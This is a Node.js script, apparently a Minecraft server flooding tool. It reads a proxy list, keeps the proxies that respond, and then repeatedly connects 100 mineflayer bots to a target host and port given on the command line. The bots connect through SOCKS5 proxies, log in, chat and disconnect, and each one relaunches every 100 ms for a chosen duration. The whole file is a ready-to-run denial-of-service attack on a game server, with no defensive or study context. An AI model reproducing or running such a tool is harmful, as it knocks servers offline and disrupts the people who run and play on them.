const mineflayer = require('mineflayer');
const ProxyAgent = require('proxy-agent');
const fs = require('fs');
const net = require('net');

const proxyFile = '../proxy/proxy.txt';
const serverHost = process.argv[2];
const serverPort = process.argv[3];
const botCount = 100;
const timeout = 250;
const floodDuration = process.argv[4] * 1000;
const threads = botCount;

function loadProxies() {
  return fs.readFileSync(proxyFile, 'utf-8').split('\n').filter(Boolean);
}

async function checkProxy(proxy) {
  const [host, port] = proxy.split(':');
  return new Promise((resolve) => {
    const socket = new net.Socket();
    socket.setTimeout(timeout);

    socket.on('connect', () => {
      socket.destroy();
      resolve(proxy);
    });

    socket.on('timeout', () => {
      socket.destroy();
      resolve(null);
    });

    socket.on('error', () => {
      socket.destroy();
      resolve(null);
    });

    socket.connect(port, host);
  });
}

function createBot(index, proxy) {
  const bot = mineflayer.createBot({
    host: serverHost,
    port: serverPort,
    username: `PermenMD_${index}`,
    agent: new ProxyAgent(`socks5://${proxy}`)
  });

  bot.on('login', () => {
    console.log(`Bot${index} has logged in`);
    bot.chat('Hey');
  });

  bot.on('chat', (username, message) => {
    if (message === 'Hey') {
      console.log(`Bot${index} sent message, disconnecting...`);
      bot.quit();
    }
  });

  bot.on('error', (err) => {
    if (!['ETIMEDOUT', 'ECONNRESET', 'ECONNREFUSED'].includes(err.code)) {
      console.log(`Bot${index} encountered an error: ${err}`);
    }
  });

  bot.on('end', () => {
    console.log(`Bot${index} has disconnected`);
  });
}

async function runBots() {
  const proxies = loadProxies();
  const validProxies = [];

  for (const proxy of proxies) {
    const validProxy = await checkProxy(proxy);
    if (validProxy) validProxies.push(validProxy);
    if (validProxies.length >= botCount) break;
  }

  if (validProxies.length < botCount) {
    console.log('Not enough valid proxies found.');
    return;
  }

  const startTime = Date.now();

  for (let i = 0; i < threads; i++) {
    (function floodThread() {
      if (Date.now() - startTime < floodDuration) {
        createBot(i + 1, validProxies[i]);

        setTimeout(floodThread, 100); // Delay to avoid immediate reconnections
      }
    })();
  }

  console.log('Flooding initiated.');
}

runBots();
